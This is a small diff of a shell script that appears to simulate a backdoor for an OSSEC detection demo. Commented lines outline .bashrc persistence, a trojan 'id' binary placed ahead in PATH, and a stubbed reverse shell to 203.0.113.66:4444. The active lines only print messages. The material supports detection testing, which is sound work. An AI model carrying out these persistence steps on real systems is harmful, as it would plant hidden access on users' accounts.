@@ -2,7 +2,7 @@
 
 # echo "$payload" >> /home/ossec-demo1/.bashrc   # мнимый reverse shell (bash /dev/tcp)
 # install -m 0755 trojan-id /home/ossec-demo1/.local/bin/id
-# echo 'export PATH=$HOME/.local/bin:$PATH' >> /home/ossec-demo1/.bashrc
+# echo 'export PATH="$HOME/.local/bin:$PATH"' >> /home/ossec-demo1/.bashrc
 # tail -n 3 /home/ossec-demo1/.bashrc
 echo "[.bashrc] выполнен"
 echo "[backdoor] reverse shell -> 203.0.113.66:4444 (демо-заглушка, без сети)"
